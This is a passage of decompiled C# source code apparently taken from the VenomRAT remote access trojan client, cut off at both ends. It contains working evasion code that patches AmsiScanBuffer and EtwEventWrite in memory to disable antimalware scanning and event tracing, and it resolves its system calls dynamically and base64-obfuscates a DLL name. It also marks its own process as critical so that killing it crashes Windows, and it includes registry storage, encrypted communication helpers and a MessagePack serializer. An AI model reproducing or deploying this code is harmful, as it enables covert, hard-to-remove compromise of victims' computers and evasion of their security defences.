			TransactionNotRequested = 3222863892u,
			TransactionAlreadyAborted = 3222863893u,
			TransactionAlreadyCommitted = 3222863894u,
			TransactionInvalidMarshallBuffer = 3222863895u,
			CurrentTransactionNotValid = 3222863896u,
			LogGrowthFailed = 3222863897u,
			ObjectNoLongerExists = 3222863905u,
			StreamMiniversionNotFound = 3222863906u,
			StreamMiniversionNotValid = 3222863907u,
			MiniversionInaccessibleFromSpecifiedTransaction = 3222863908u,
			CantOpenMiniversionWithModifyIntent = 3222863909u,
			CantCreateMoreStreamMiniversions = 3222863910u,
			HandleNoLongerValid = 3222863912u,
			NoTxfMetadata = 3222863913u,
			LogCorruptionDetected = 3222863920u,
			CantRecoverWithHandleOpen = 3222863921u,
			RmDisconnected = 3222863922u,
			EnlistmentNotSuperior = 3222863923u,
			RecoveryNotNeeded = 3222863924u,
			RmAlreadyStarted = 3222863925u,
			FileIdentityNotPersistent = 3222863926u,
			CantBreakTransactionalDependency = 3222863927u,
			CantCrossRmBoundary = 3222863928u,
			TxfDirNotEmpty = 3222863929u,
			IndoubtTransactionsExist = 3222863930u,
			TmVolatile = 3222863931u,
			RollbackTimerExpired = 3222863932u,
			TxfAttributeCorrupt = 3222863933u,
			EfsNotAllowedInTransaction = 3222863934u,
			TransactionalOpenNotAllowed = 3222863935u,
			TransactedMappingUnsupportedRemote = 3222863936u,
			TxfMetadataAlreadyPresent = 3222863937u,
			TransactionScopeCallbacksNotSet = 3222863938u,
			TransactionRequiredPromotion = 3222863939u,
			CannotExecuteFileInTransaction = 3222863940u,
			TransactionsNotFrozen = 3222863941u,
			MaximumNtStatus = uint.MaxValue
		}

		public class Delegates
		{
			[UnmanagedFunctionPointer(CallingConvention.StdCall)]
			public delegate uint NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, ref uint OldProtect);
		}

		private static IntPtr GetLibraryAddress(string DLLName, string FunctionName)
		{
			IntPtr loadedModuleAddress = GetLoadedModuleAddress(DLLName);
			if (loadedModuleAddress == IntPtr.Zero)
			{
				throw new DllNotFoundException(DLLName + ", Dll was not found or not loaded.");
			}
			return GetExportAddress(loadedModuleAddress, FunctionName);
		}

		private static IntPtr GetLoadedModuleAddress(string DLLName)
		{
			foreach (ProcessModule module in Process.GetCurrentProcess().Modules)
			{
				if (string.Compare(module.ModuleName, DLLName, ignoreCase: true) == 0)
				{
					return module.BaseAddress;
				}
			}
			return IntPtr.Zero;
		}

		private static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName)
		{
			IntPtr intPtr = IntPtr.Zero;
			try
			{
				int num = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 60));
				Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + num + 20));
				long num2 = ModuleBase.ToInt64() + num + 24;
				short num3 = Marshal.ReadInt16((IntPtr)num2);
				long num4 = 0L;
				num4 = ((num3 != 267) ? (num2 + 112) : (num2 + 96));
				int num5 = Marshal.ReadInt32((IntPtr)num4);
				int num6 = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + num5 + 16));
				Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + num5 + 20));
				int num7 = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + num5 + 24));
				int num8 = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + num5 + 28));
				int num9 = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + num5 + 32));
				int num10 = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + num5 + 36));
				for (int i = 0; i < num7; i++)
				{
					if (Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + num9 + i * 4)))).Equals(ExportName, StringComparison.OrdinalIgnoreCase))
					{
						int num11 = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + num10 + i * 2)) + num6;
						int num12 = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + num8 + 4 * (num11 - num6)));
						intPtr = (IntPtr)((long)ModuleBase + num12);
						break;
					}
				}
			}
			catch
			{
				throw new InvalidOperationException("Failed to parse module exports.");
			}
			if (intPtr == IntPtr.Zero)
			{
				throw new MissingMethodException(ExportName + ", export not found.");
			}
			return intPtr;
		}

		public static object DynamicAPIInvoke(string DLLName, string FunctionName, Type FunctionDelegateType, ref object[] Parameters)
		{
			IntPtr libraryAddress = GetLibraryAddress(DLLName, FunctionName);
			if (libraryAddress == IntPtr.Zero)
			{
				throw new InvalidOperationException("Could not get the handle for the function.");
			}
			return DynamicFunctionInvoke(libraryAddress, FunctionDelegateType, ref Parameters);
		}

		private static object DynamicFunctionInvoke(IntPtr FunctionPointer, Type FunctionDelegateType, ref object[] Parameters)
		{
			return Marshal.GetDelegateForFunctionPointer(FunctionPointer, FunctionDelegateType).DynamicInvoke(Parameters);
		}

		public static bool NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, ref uint OldProtect)
		{
			OldProtect = 0u;
			object[] Parameters = new object[5] { ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect };
			if ((NTSTATUS)DynamicAPIInvoke("ntdll.dll", "NtProtectVirtualMemory", typeof(Delegates.NtProtectVirtualMemory), ref Parameters) != NTSTATUS.Success)
			{
				return false;
			}
			OldProtect = (uint)Parameters[4];
			return true;
		}
	}
	public class A
	{
		private static byte[] x64_etw_patch = new byte[4] { 72, 51, 192, 195 };

		private static byte[] x86_etw_patch = new byte[5] { 51, 192, 194, 20, 0 };

		private static byte[] x64_am_si_patch = new byte[6] { 184, 87, 0, 7, 128, 195 };

		private static byte[] x86_am_si_patch = new byte[8] { 184, 87, 0, 7, 128, 194, 24, 0 };

		private static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName)
		{
			IntPtr intPtr = IntPtr.Zero;
			try
			{
				int num = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 60));
				Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + num + 20));
				long num2 = ModuleBase.ToInt64() + num + 24;
				short num3 = Marshal.ReadInt16((IntPtr)num2);
				long num4 = 0L;
				num4 = ((num3 != 267) ? (num2 + 112) : (num2 + 96));
				int num5 = Marshal.ReadInt32((IntPtr)num4);
				int num6 = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + num5 + 16));
				Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + num5 + 20));
				int num7 = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + num5 + 24));
				int num8 = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + num5 + 28));
				int num9 = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + num5 + 32));
				int num10 = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + num5 + 36));
				for (int i = 0; i < num7; i++)
				{
					if (Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + num9 + i * 4)))).Equals(ExportName, StringComparison.OrdinalIgnoreCase))
					{
						int num11 = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + num10 + i * 2)) + num6;
						int num12 = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + num8 + 4 * (num11 - num6)));
						intPtr = (IntPtr)((long)ModuleBase + num12);
						break;
					}
				}
			}
			catch
			{
				throw new InvalidOperationException("Failed to parse module exports.");
			}
			if (intPtr == IntPtr.Zero)
			{
				throw new MissingMethodException(ExportName + " not found.");
			}
			return intPtr;
		}

		private static string decode(string b64encoded)
		{
			return Encoding.ASCII.GetString(Convert.FromBase64String(b64encoded));
		}

		private static void PatchMem(byte[] patch, string library, string function)
		{
			try
			{
				IntPtr processHandle = new IntPtr(-1);
				IntPtr BaseAddress = GetExportAddress((from ProcessModule x in Process.GetCurrentProcess().Modules
					where library.Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)
					select x).FirstOrDefault().BaseAddress, function);
				IntPtr RegionSize = new IntPtr(patch.Length);
				uint OldProtect = 0u;
				DInvokeCore.NtProtectVirtualMemory(processHandle, ref BaseAddress, ref RegionSize, 64u, ref OldProtect);
				Marshal.Copy(patch, 0, BaseAddress, patch.Length);
			}
			catch (Exception ex)
			{
				Console.WriteLine(" [!] {0}", ex.Message);
				Console.WriteLine(" [!] {0}", ex.InnerException);
			}
		}

		private static void Patcham_si(byte[] patch)
		{
			string text = decode("YW1zaS5kbGw=");
			foreach (ProcessModule module in Process.GetCurrentProcess().Modules)
			{
				if (module.ModuleName == text)
				{
					PatchMem(patch, text, "AmsiScanBuffer");
				}
			}
		}

		private static void PatchETW(byte[] Patch)
		{
			PatchMem(Patch, "ntdll.dll", "EtwEventWrite");
		}

		public static void B()
		{
			if (IntPtr.Size != 4)
			{
				Patcham_si(x64_am_si_patch);
				PatchETW(x64_etw_patch);
			}
			else
			{
				Patcham_si(x86_am_si_patch);
				PatchETW(x86_etw_patch);
			}
		}
	}
	public static class MutexControl
	{
		public static Mutex currentApp;

		public static bool CreateMutex()
		{
			currentApp = new Mutex(initiallyOwned: false, Settings.MTX, out var createdNew);
			return createdNew;
		}

		public static void CloseMutex()
		{
			if (currentApp != null)
			{
				currentApp.Close();
				currentApp = null;
			}
		}
	}
	public static class NativeMethods
	{
		public enum EXECUTION_STATE : uint
		{
			ES_CONTINUOUS = 2147483648u,
			ES_DISPLAY_REQUIRED = 2u,
			ES_SYSTEM_REQUIRED = 1u
		}

		internal struct LASTINPUTINFO
		{
			public static readonly int SizeOf = Marshal.SizeOf(typeof(LASTINPUTINFO));

			[MarshalAs(UnmanagedType.U4)]
			public uint cbSize;

			[MarshalAs(UnmanagedType.U4)]
			public uint dwTime;
		}

		[DllImport("user32.dll")]
		public static extern IntPtr GetForegroundWindow();

		[DllImport("user32.dll")]
		public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

		[DllImport("ntdll.dll", SetLastError = true)]
		public static extern void RtlSetProcessIsCritical(uint v1, uint v2, uint v3);
	}
	public static class ProcessCritical
	{
		public static void SystemEvents_SessionEnding(object sender, SessionEndingEventArgs e)
		{
			if (Convert.ToBoolean(Settings.BS_OD) && Methods.IsAdmin())
			{
				Exit();
			}
		}

		public static void Set()
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_0011: Expected O, but got Unknown
			try
			{
				SystemEvents.SessionEnding += new SessionEndingEventHandler(SystemEvents_SessionEnding);
				Process.EnterDebugMode();
				NativeMethods.RtlSetProcessIsCritical(1u, 0u, 0u);
			}
			catch
			{
			}
		}

		public static void Exit()
		{
			try
			{
				NativeMethods.RtlSetProcessIsCritical(0u, 0u, 0u);
			}
			catch
			{
				while (true)
				{
					Thread.Sleep(100000);
				}
			}
		}
	}
	public static class SetRegistry
	{
		private static readonly string ID = "Software\\" + Settings.Hw_id;

		public static void InitRegistry()
		{
			try
			{
				Registry.CurrentUser.DeleteSubKeyTree(ID);
			}
			catch
			{
			}
		}

		public static bool SetValue(string name, byte[] value)
		{
			try
			{
				using RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(ID, RegistryKeyPermissionCheck.ReadWriteSubTree);
				registryKey.SetValue(name, value, RegistryValueKind.Binary);
				return true;
			}
			catch (Exception ex)
			{
				ClientSocket.Error(ex.Message);
			}
			return false;
		}

		public static byte[] GetValue(string value)
		{
			try
			{
				using RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(ID);
				return (byte[])registryKey.GetValue(value);
			}
			catch (Exception ex)
			{
				ClientSocket.Error(ex.Message);
			}
			return null;
		}

		public static bool DeleteValue(string name)
		{
			try
			{
				using RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(ID);
				registryKey.DeleteValue(name);
				return true;
			}
			catch (Exception ex)
			{
				ClientSocket.Error(ex.Message);
			}
			return false;
		}

		public static bool DeleteSubKey()
		{
			try
			{
				using RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("", writable: true);
				registryKey.DeleteSubKeyTree(ID);
				return true;
			}
			catch (Exception ex)
			{
				ClientSocket.Error(ex.Message);
			}
			return false;
		}
	}
}
namespace Client.Algorithm
{
	public class Aes256
	{
		private const int KeyLength = 32;

		private const int AuthKeyLength = 64;

		private const int IvLength = 16;

		private const int HmacSha256Length = 32;

		private readonly byte[] _key;

		private readonly byte[] _authKey;

		private static readonly byte[] Salt = Encoding.ASCII.GetBytes("VenomRATByVenom");

		public Aes256(string masterKey)
		{
			if (string.IsNullOrEmpty(masterKey))
			{
				throw new ArgumentException("masterKey can not be null or empty.");
			}
			using Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(masterKey, Salt, 50000);
			_key = rfc2898DeriveBytes.GetBytes(32);
			_authKey = rfc2898DeriveBytes.GetBytes(64);
		}

		public string Encrypt(string input)
		{
			return Convert.ToBase64String(Encrypt(Encoding.UTF8.GetBytes(input)));
		}

		public byte[] Encrypt(byte[] input)
		{
			if (input == null)
			{
				throw new ArgumentNullException("input can not be null.");
			}
			using MemoryStream memoryStream = new MemoryStream();
			memoryStream.Position = 32L;
			using (AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider())
			{
				aesCryptoServiceProvider.KeySize = 256;
				aesCryptoServiceProvider.BlockSize = 128;
				aesCryptoServiceProvider.Mode = CipherMode.CBC;
				aesCryptoServiceProvider.Padding = PaddingMode.PKCS7;
				aesCryptoServiceProvider.Key = _key;
				aesCryptoServiceProvider.GenerateIV();
				using CryptoStream cryptoStream = new CryptoStream(memoryStream, aesCryptoServiceProvider.CreateEncryptor(), CryptoStreamMode.Write);
				memoryStream.Write(aesCryptoServiceProvider.IV, 0, aesCryptoServiceProvider.IV.Length);
				cryptoStream.Write(input, 0, input.Length);
				cryptoStream.FlushFinalBlock();
				using HMACSHA256 hMACSHA = new HMACSHA256(_authKey);
				byte[] array = hMACSHA.ComputeHash(memoryStream.ToArray(), 32, memoryStream.ToArray().Length - 32);
				memoryStream.Position = 0L;
				memoryStream.Write(array, 0, array.Length);
			}
			return memoryStream.ToArray();
		}

		public string Decrypt(string input)
		{
			return Encoding.UTF8.GetString(Decrypt(Convert.FromBase64String(input)));
		}

		public byte[] Decrypt(byte[] input)
		{
			if (input == null)
			{
				throw new ArgumentNullException("input can not be null.");
			}
			using MemoryStream memoryStream = new MemoryStream(input);
			using AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
			aesCryptoServiceProvider.KeySize = 256;
			aesCryptoServiceProvider.BlockSize = 128;
			aesCryptoServiceProvider.Mode = CipherMode.CBC;
			aesCryptoServiceProvider.Padding = PaddingMode.PKCS7;
			aesCryptoServiceProvider.Key = _key;
			using (HMACSHA256 hMACSHA = new HMACSHA256(_authKey))
			{
				byte[] a = hMACSHA.ComputeHash(memoryStream.ToArray(), 32, memoryStream.ToArray().Length - 32);
				byte[] array = new byte[32];
				memoryStream.Read(array, 0, array.Length);
				if (!AreEqual(a, array))
				{
					throw new CryptographicException("Invalid message authentication code (MAC).");
				}
			}
			byte[] array2 = new byte[16];
			memoryStream.Read(array2, 0, 16);
			aesCryptoServiceProvider.IV = array2;
			using CryptoStream cryptoStream = new CryptoStream(memoryStream, aesCryptoServiceProvider.CreateDecryptor(), CryptoStreamMode.Read);
			byte[] array3 = new byte[memoryStream.Length - 16 + 1];
			byte[] array4 = new byte[cryptoStream.Read(array3, 0, array3.Length)];
			Buffer.BlockCopy(array3, 0, array4, 0, array4.Length);
			return array4;
		}

		[MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
		private bool AreEqual(byte[] a1, byte[] a2)
		{
			bool result = true;
			for (int i = 0; i < a1.Length; i++)
			{
				if (a1[i] != a2[i])
				{
					result = false;
				}
			}
			return result;
		}
	}
}
namespace MessagePackLib.MessagePack
{
	public class BytesTools
	{
		private static UTF8Encoding utf8Encode = new UTF8Encoding();

		public static byte[] GetUtf8Bytes(string s)
		{
			return utf8Encode.GetBytes(s);
		}

		public static string GetString(byte[] utf8Bytes)
		{
			return utf8Encode.GetString(utf8Bytes);
		}

		public static string BytesAsString(byte[] bytes)
		{
			StringBuilder stringBuilder = new StringBuilder();
			foreach (byte b in bytes)
			{
				stringBuilder.Append($"{b:D3} ");
			}
			return stringBuilder.ToString();
		}

		public static string BytesAsHexString(byte[] bytes)
		{
			StringBuilder stringBuilder = new StringBuilder();
			foreach (byte b in bytes)
			{
				stringBuilder.Append($"{b:X2} ");
			}
			return stringBuilder.ToString();
		}

		public static byte[] SwapBytes(byte[] v)
		{
			byte[] array = new byte[v.Length];
			int num = v.Length - 1;
			for (int i = 0; i < array.Length; i++)
			{
				array[i] = v[num];
				num--;
			}
			return array;
		}

		public static byte[] SwapInt64(long v)
		{
			return SwapBytes(BitConverter.GetBytes(v));
		}

		public static byte[] SwapInt32(int v)
		{
			byte[] array = new byte[4];
			array[3] = (byte)v;
			array[2] = (byte)(v >> 8);
			array[1] = (byte)(v >> 16);
			array[0] = (byte)(v >> 24);
			return array;
		}

		public static byte[] SwapInt16(short v)
		{
			byte[] array = new byte[2];
			array[1] = (byte)v;
			array[0] = (byte)(v >> 8);
			return array;
		}

		public static byte[] SwapDouble(double v)
		{
			return SwapBytes(BitConverter.GetBytes(v));
		}
	}
	public class MsgPackEnum : IEnumerator
	{
		private List<MsgPack> children;

		private int position = -1;

		object IEnumerator.Current => children[position];

		public MsgPackEnum(List<MsgPack> obj)
		{
			children = obj;
		}

		bool IEnumerator.MoveNext()
		{
			position++;
			return position < children.Count;
		}

		void IEnumerator.Reset()
		{
			position = -1;
		}
	}
	public class MsgPackArray
	{
		private List<MsgPack> children;

		private MsgPack owner;

		public MsgPack this[int index] => children[index];

		public int Length => children.Count;

		public MsgPackArray(MsgPack msgpackObj, List<MsgPack> listObj)
		{
			owner = msgpackObj;
			children = listObj;
		}

		public MsgPack Add()
		{
			return owner.AddArrayChild();
		}

		public MsgPack Add(string value)
		{
			MsgPack msgPack = owner.AddArrayChild();
			msgPack.AsString = value;
			return msgPack;
		}

		public MsgPack Add(long value)
		{
			MsgPack msgPack = owner.AddArrayChild();
			msgPack.SetAsInteger(value);
			return msgPack;
		}

		public MsgPack Add(double value)
		{
			MsgPack msgPack = owner.AddArrayChild();
			msgPack.SetAsFloat(value);
			return msgPack;
		}
	}
	public class MsgPack : IEnumerable
	{
		private string name;

		private string lowerName;

		private object innerValue;

		private MsgPackType valueType;

		private MsgPack parent;

		private List<MsgPack> children = new List<MsgPack>();

		private MsgPackArray refAsArray;

		public string AsString
		{
			get
			{
				return GetAsString();
			}
			set
			{
				SetAsString(value);
			}
		}

		public long AsInteger
		{
			get
			{
				return GetAsInteger();
			}
			set
			{
				SetAsInteger(value);
			}
		}

		public double AsFloat
		{
			get
			{
				return GetAsFloat();
			}
			set
			{
				SetAsFloat(value);
			}
		}

		public MsgPackArray AsArray
		{
			get
			{
				lock (this)
				{
					if (refAsArray == null)
					{
						refAsArray = new MsgPackArray(this, children);
					}
				}
				return refAsArray;
			}
		}

		public MsgPackType ValueType => valueType;

		private void SetName(string value)
		{
			name = value;
			lowerName = name.ToLower();
		}

		private void Clear()
		{
			for (int i = 0; i < children.Count; i++)
			{
				children[i].Clear();
			}
			children.Clear();
		}

		private MsgPack InnerAdd()
		{
			MsgPack msgPack = new MsgPack();
			msgPack.parent = this;
			children.Add(msgPack);
			return msgPack;
		}

		private int IndexOf(string name)
		{
			int num = -1;
			int result = -1;
			string text = name.ToLower();
			foreach (MsgPack child in children)
			{
				num++;
				if (text.Equals(child.lowerName))
				{
					result = num;
					break;
				}
			}
			return result;
		}

		public MsgPack FindObject(string name)
		{
			int num = IndexOf(name);
			if (num == -1)
			{
				return null;
			}
			return children[num];
		}

		private MsgPack InnerAddMapChild()
		{
			if (valueType != MsgPackType.Map)
			{
				Clear();
				valueType = MsgPackType.Map;
			}
			return InnerAdd();
		}

		private MsgPack InnerAddArrayChild()
		{
			if (valueType != MsgPackType.Array)
			{
				Clear();
				valueType = MsgPackType.Array;
			}
			return InnerAdd();
		}

		public MsgPack AddArrayChild()
		{
			return InnerAddArrayChild();
		}

		private void WriteMap(Stream ms)
		{
			int count = children.Count;
			if (count <= 15)
			{
				byte value = (byte)(128 + (byte)count);
				ms.WriteByte(value);
			}
			else if (count <= 65535)
			{
				byte value = 222;
				ms.WriteByte(value);
				byte[] array = BytesTools.SwapBytes(BitConverter.GetBytes((short)count));
				ms.Write(array, 0, array.Length);
			}
			else
			{
				byte value = 223;
				ms.WriteByte(value);
				byte[] array = BytesTools.SwapBytes(BitConverter.GetBytes(count));
				ms.Write(array, 0, array.Length);
			}
			for (int i = 0; i < count; i++)
			{
				WriteTools.WriteString(ms, children[i].name);
				children[i].Encode2Stream(ms);
			}
		}

		private void WirteArray(Stream ms)
		{
			int count = children.Count;
			if (count <= 15)
			{
				byte value = (byte)(144 + (byte)count);
				ms.WriteByte(value);
			}
			else if (count <= 65535)
			{
				byte value = 220;
				ms.WriteByte(value);
				byte[] array = BytesTools.SwapBytes(BitConverter.GetBytes((short)count));
				ms.Write(array, 0, array.Length);
			}
			else
			{
				byte value = 221;
				ms.WriteByte(value);
				byte[] array = BytesTools.SwapBytes(BitConverter.GetBytes(count));
				ms.Write(array, 0, array.Length);
			}
			for (int i = 0; i < count; i++)
			{
				children[i].Encode2Stream(ms);
			}
		}

		public void SetAsInteger(long value)
		{
			innerValue = value;
			valueType = MsgPackType.Integer;
		}

		public void SetAsUInt64(ulong value)
		{
			innerValue = value;
			valueType = MsgPackType.UInt64;
		}

		public ulong GetAsUInt64()
		{
			return valueType switch
			{
				MsgPackType.Integer => Convert.ToUInt64((long)innerValue), 
				MsgPackType.UInt64 => (ulong)innerValue, 
				MsgPackType.String => ulong.Parse(innerValue.ToString().Trim()), 
				MsgPackType.Float => Convert.ToUInt64((double)innerValue), 
				MsgPackType.Single => Convert.ToUInt64((float)innerValue), 
				MsgPackType.DateTime => Convert.ToUInt64((DateTime)innerValue), 
				_ => 0uL, 
			};
		}

		public long GetAsInteger()
		{
			return valueType switch
			{
				MsgPackType.Integer => (long)innerValue, 
				MsgPackType.UInt64 => Convert.ToInt64((long)innerValue), 
				MsgPackType.String => long.Parse(innerValue.ToString().Trim()), 
				MsgPackType.Float => Convert.ToInt64((double)innerValue), 
				MsgPackType.Single => Convert.ToInt64((float)innerValue), 
				MsgPackType.DateTime => Convert.ToInt64((DateTime)innerValue), 
				_ => 0L, 
			};
		}

		public double GetAsFloat()
		{
			return valueType switch
			{
				MsgPackType.Integer => Convert.ToDouble((long)innerValue), 
				MsgPackType.String => double.Parse((string)innerValue), 
				MsgPackType.Float => (double)innerValue, 
				MsgPackType.Single => (float)innerValue, 
				MsgPackType.DateTime => Convert.ToInt64((DateTime)innerValue), 
				_ => 0.0, 
			};
		}

		public void SetAsBytes(byte[] value)
		{
			innerValue = value;
			valueType = MsgPackType.Binary;
		}

		public byte[] GetAsBytes()
		{
			return valueType switch
			{
				MsgPackType.Integer => BitConverter.GetBytes((long)innerValue), 
				MsgPackType.String => BytesTools.GetUtf8Bytes(innerValue.ToString()), 
				MsgPackType.Float => BitConverter.GetBytes((double)innerValue), 
				MsgPackType.Single => BitConverter.GetBytes((float)innerValue), 
				MsgPackType.DateTime => BitConverter.GetBytes(((DateTime)innerValue).ToBinary()), 
				MsgPackType.Binary => (byte[])innerValue, 
				_ => new byte[0], 
			};
		}

		public void Add(string key, string value)
		{
			MsgPack msgPack = InnerAddArrayChild();
			msgPack.name = key;
			msgPack.SetAsString(value);
		}

		public void Add(string key, int value)
		{
			MsgPack msgPack = InnerAddArrayChild();
			msgPack.name = key;
			msgPack.SetAsInteger(value);
		}

		public bool LoadFileAsBytes(string fileName)
		{
			if (File.Exists(fileName))
			{
				byte[] array = null;
				FileStream fileStream = new FileStream(fileName, FileMode.Open, FileAccess.Read, FileShare.Read);
				array = new byte[fileStream.Length];
				fileStream.Read(array, 0, (int)fileStream.Length);
				fileStream.Close();
				fileStream.Dispose();
				SetAsBytes(array);
				return true;
			}
			return false;
		}

		public bool SaveBytesToFile(string fileName)
		{
			if (innerValue != null)
			{
				FileStream fileStream = new FileStream(fileName, FileMode.Append);
				fileStream.Write((byte[])innerValue, 0, ((byte[])innerValue).Length);
				fileStream.Close();
				fileStream.Dispose();
				return true;
			}
			return false;
		}

		public MsgPack ForcePathObject(string path)
		{
			MsgPack msgPack = this;
			string[] array = path.Trim().Split(new char[3] { '.', '/', '\\' });
			string text = null;
			if (array.Length == 0)
			{
				return null;
			}
			if (array.Length > 1)
			{
				for (int i = 0; i < array.Length - 1; i++)
				{
					text = array[i];
					MsgPack msgPack2 = msgPack.FindObject(text);
					if (msgPack2 == null)
					{
						msgPack = msgPack.InnerAddMapChild();
						msgPack.SetName(text);
					}
					else
					{
						msgPack = msgPack2;
					}
				}
			}
			text = array[^1];
			int num = msgPack.IndexOf(text);
			if (num > -1)
			{
				return msgPack.children[num];
			}
			msgPack = msgPack.InnerAddMapChild();
			msgPack.SetName(text);
			return msgPack;
		}

		public void SetAsNull()
		{
			Clear();
			innerValue = null;
			valueType = MsgPackType.Null;
		}

		public void SetAsString(string value)
		{
			innerValue = value;
			valueType = MsgPackType.String;
		}

		public string GetAsString()
		{
			if (innerValue == null)
			{
				return "";
			}
			return innerValue.ToString();
		}

		public void SetAsBoolean(bool bVal)
		{
			valueType = MsgPackType.Boolean;
			innerValue = bVal;
		}

		public bool GetAsBoolean()
		{
			if (innerValue != null && innerValue is bool)
			{
				return (bool)innerValue;
			}
			return false;
		}

		public void SetAsSingle(float fVal)
		{
			valueType = MsgPackType.Single;
			innerValue = fVal;
		}

		public void SetAsFloat(double fVal)
		{
			valueType = MsgPackType.Float;
			innerValue = fVal;
		}

		public void DecodeFromBytes(byte[] bytes)
		{
			using MemoryStream memoryStream = new MemoryStream();
			bytes = Zip.Decompress(bytes);
			memoryStream.Write(bytes, 0, bytes.Length);
			memoryStream.Position = 0L;
			DecodeFromStream(memoryStream);
		}

		public void DecodeFromFile(string fileName)
		{
			FileStream fileStream = new FileStream(fileName, FileMode.Open);
			DecodeFromStream(fileStream);
			fileStream.Dispose();
		}

		public void DecodeFromStream(Stream ms)
		{
			byte b = (byte)ms.ReadByte();
			byte[] array = null;
			int num = 0;
			int num2 = 0;
			if (b <= 127)
			{
				SetAsInteger(b);
				return;
			}
			if (b >= 128 && b <= 143)
			{
				Clear();
				valueType = MsgPackType.Map;
				num = b - 128;
				for (num2 = 0; num2 < num; num2++)
				{
					MsgPack msgPack = InnerAdd();
					msgPack.SetName(ReadTools.ReadString(ms));
					msgPack.DecodeFromStream(ms);
				}
				return;
			}
			if (b >= 144 && b <= 159)
			{
				Clear();
				valueType = MsgPackType.Array;
				num = b - 144;
				for (num2 = 0; num2 < num; num2++)
				{
					InnerAdd().DecodeFromStream(ms);
				}
				return;
			}
			if (b >= 160 && b <= 191)
			{
				num = b - 160;
				SetAsString(ReadTools.ReadString(ms, num));
				return;
			}
			if (b >= 224 && b <= byte.MaxValue)
			{
				SetAsInteger((sbyte)b);
				return;
			}
			switch (b)
			{
			case 192:
				SetAsNull();
				return;
			case 193:
				throw new Exception("(never used) type $c1");
			case 194:
				SetAsBoolean(bVal: false);
				return;
			case 195:
				SetAsBoolean(bVal: true);
				return;
			case 196:
				num = ms.ReadByte();
				array = new byte[num];
				ms.Read(array, 0, num);
				SetAsBytes(array);
				return;
			case 197:
				array = new byte[2];
				ms.Read(array, 0, 2);
				array = BytesTools.SwapBytes(array);
				num = BitConverter.ToUInt16(array, 0);
				array = new byte[num];
				ms.Read(array, 0, num);
				SetAsBytes(array);
				return;
			case 198:
				array = new byte[4];
				ms.Read(array, 0, 4);
				array = BytesTools.SwapBytes(array);
				num = BitConverter.ToInt32(array, 0);
				array = new byte[num];
				ms.Read(array, 0, num);
				SetAsBytes(array);
				return;
			case 199:
			case 200:
			case 201:
				throw new Exception("(ext8,ext16,ex32) type $c7,$c8,$c9");
			case 202:
				array = new byte[4];
				ms.Read(array, 0, 4);
				array = BytesTools.SwapBytes(array);
				SetAsSingle(BitConverter.ToSingle(array, 0));
				return;
			case 203:
				array = new byte[8];
				ms.Read(array, 0, 8);
				array = BytesTools.SwapBytes(array);
				SetAsFloat(BitConverter.ToDouble(array, 0));
				return;
			case 204:
				b = (byte)ms.ReadByte();
				SetAsInteger(b);
				return;
			case 205:
				array = new byte[2];
				ms.Read(array, 0, 2);
				array = BytesTools.SwapBytes(array);
				SetAsInteger(BitConverter.ToUInt16(array, 0));
				return;
			case 206:
				array = new byte[4];
				ms.Read(array, 0, 4);
				array = BytesTools.SwapBytes(array);
				SetAsInteger(BitConverter.ToUInt32(array, 0));
				return;
			case 207:
				array = new byte[8];
				ms.Read(array, 0, 8);
				array = BytesTools.SwapBytes(array);
				SetAsUInt64(BitConverter.ToUInt64(array, 0));
				return;
			case 220:
				array = new byte[2];
				ms.Read(array, 0, 2);
				array = BytesTools.SwapBytes(array);
				num = BitConverter.ToInt16(array, 0);
				Clear();
				valueType = MsgPackType.Array;
				for (num2 = 0; num2 < num; num2++)
				{
					InnerAdd().DecodeFromStream(ms);
				}
				return;
			case 221:
				array = new byte[4];
				ms.Read(array, 0, 4);
				array = BytesTools.SwapBytes(array);
				num = BitConverter.ToInt16(array, 0);
				Clear();
				valueType = MsgPackType.Array;
				for (num2 = 0; num2 < num; num2++)
				{
					InnerAdd().DecodeFromStream(ms);
				}
				return;
			case 217:
				SetAsString(ReadTools.ReadString(b, ms));
				return;
			case 222:
				array = new byte[2];
				ms.Read(array, 0, 2);
